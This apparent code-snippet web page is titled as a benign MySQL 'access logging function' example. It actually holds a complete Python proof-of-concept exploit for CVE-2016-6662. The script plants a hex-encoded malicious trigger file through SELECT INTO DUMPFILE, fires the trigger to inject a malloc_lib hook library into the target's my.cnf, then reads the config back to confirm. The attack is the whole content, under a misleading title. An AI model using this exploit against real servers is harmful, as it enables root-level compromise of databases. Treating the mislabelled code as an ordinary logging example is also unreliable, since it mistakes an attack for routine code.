---
title: mysql example access logging function (snippet)
date: 2020-03-03
tags: ["python"]
---
Python mysql example 'access logging function'

Functions in program: 
* `def shutdown(code):`
* `def errmsg(str):`
* `def info(str):`

Modules used in program: 
* `import mysql.connector`
* `import argparse`

## python access logging function

Python mysql example: access logging function

```python
#!/usr/bin/env python
import argparse
import mysql.connector

def info(str):
    print("[+] " + str + "\n")

def errmsg(str):
    print("[!] " + str + "\n")

def shutdown(code):
    if (code==0):
        info("Exiting (code: %d)\n" % code)
    else:
        errmsg("Exiting (code: %d)\n" % code)
    exit(code)

# Parse input args
parser = argparse.ArgumentParser(prog='access_logging_function.py', description='PoC for MySQL Remote Root Code Execution / Privesc CVE-2016-6662')
parser.add_argument('-dbuser', dest='TARGET_USER', required=True, help='MySQL username')
parser.add_argument('-dbpass', dest='TARGET_PASS', required=True, help='MySQL password')
parser.add_argument('-dbname', dest='TARGET_DB',   required=True, help='Remote MySQL database name')
parser.add_argument('-dbhost', dest='TARGET_HOST', required=True, help='Remote MySQL host')
parser.add_argument('-mycnf', dest='TARGET_MYCNF', required=True, help='Remote my.cnf owned by mysql user')

args = parser.parse_args()


info("Connecting to target server %s and target mysql account '%s@%s' using DB '%s'" % (args.TARGET_HOST, args.TARGET_USER, args.TARGET_HOST, args.TARGET_DB))
try:
    dbconn = mysql.connector.connect(user=args.TARGET_USER, password=args.TARGET_PASS, database=args.TARGET_DB, host=args.TARGET_HOST)
except mysql.connector.Error as err:
    errmsg("Failed to connect to the target: {}".format(err))
    shutdown(1)

try:
    cursor = dbconn.cursor()
    cursor.execute("SHOW GRANTS")
except mysql.connector.Error as err:
    errmsg("Something went wrong: {}".format(err))
    shutdown(2)

privs = cursor.fetchall()
info("The account in use has the following grants/perms: " )
for priv in privs:
    print(priv[0])
print("")


# Trigger payload that will elevate user privileges and sucessfully execute SET GLOBAL GENERAL_LOG 
# Decoded payload (paths may differ):
malloc_lib_path='/var/lib/mysql/mysql_hookandroot_lib.so'
"""
DELIMITER //
CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf
AFTER INSERT
   ON `poctable` FOR EACH ROW
BEGIN

   DECLARE void varchar(550);
   set global general_log_file='/var/lib/mysql/my.cnf';
   set global general_log = on;
   select "

# 0ldSQL_MySQL_RCE_exploit got here :)

[mysqld]
malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'

[abyss]
" INTO void;   
   set global general_log = off;

END; //
DELIMITER ;
"""
trigger_payload="""TYPE=TRIGGERS
triggers='CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf\\nAFTER INSERT\\n   ON `poctable` FOR EACH ROW\\nBEGIN\\n\\n   DECLARE void varchar(550);\\n   set global general_log_file=\\'%s\\';\\n   set global general_log = on;\\n   select "\\n\\n# 0ldSQL_MySQL_RCE_exploit got here :)\\n\\n[mysqld]\\nmalloc_lib=\\'%s\\'\\n\\n[abyss]\\n" INTO void;   \\n   set global general_log = off;\\n\\nEND'
sql_modes=0
definers='root@localhost'
client_cs_names='utf8'
connection_cl_names='utf8_general_ci'
db_cl_names='latin1_swedish_ci'
""" % (args.TARGET_MYCNF, malloc_lib_path)

# Convert trigger into HEX to pass it to unhex() SQL function
trigger_payload_hex = "".join("{:02x}".format(ord(c)) for c in trigger_payload)

info("TRIGGER_PAYLOAD \n%s" % trigger_payload)
info("TRIGGER_PAYLOAD_HEX \n%s" % trigger_payload_hex)

# Save trigger into a trigger file
TRG_path="/var/lib/mysql/%s/poctable.TRG" % args.TARGET_DB
info("Saving trigger payload into %s" % (TRG_path))
try:
    cursor = dbconn.cursor()
    cursor.execute("""SELECT unhex("%s") INTO DUMPFILE '%s' """ % (trigger_payload_hex, TRG_path) )
except mysql.connector.Error as err:
    errmsg("Something went wrong: {}".format(err))
    shutdown(4)

# Creating table poctable so that /var/lib/mysql/pocdb/poctable.TRG trigger gets loaded by the server
info("Creating table 'poctable' so that injected 'poctable.TRG' trigger gets loaded")
try:
    cursor = dbconn.cursor()
    cursor.execute("CREATE TABLE `poctable` (line varchar(600)) ENGINE='MyISAM'"  )
except mysql.connector.Error as err:
    errmsg("Something went wrong: {}".format(err))
    shutdown(6)

# Finally, execute the trigger's payload by inserting anything into `poctable`.
# The payload will write to the mysql config file at this point.
info("Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config %s" % args.TARGET_MYCNF )
try:
    cursor = dbconn.cursor()
    cursor.execute("INSERT INTO `poctable` VALUES('execute the trigger!');" )
except mysql.connector.Error as err:
    errmsg("Something went wrong: {}".format(err))
    shutdown(6)

# Check on the config that was just created
info("Showing the contents of %s config to verify that our setting (malloc_lib) got injected" % args.TARGET_MYCNF )
try:
    cursor = dbconn.cursor()
    cursor.execute("SELECT load_file('%s')" % args.TARGET_MYCNF)
except mysql.connector.Error as err:
    errmsg("Something went wrong: {}".format(err))
    shutdown(2)
finally:
    dbconn.close()  # Close DB connection
print("")
myconfig = cursor.fetchall()
print(myconfig[0][0])




```

## Python links

- Learn Python: https://pythonbasics.org/
- Python Tutorial: https://pythonprogramminglanguage.com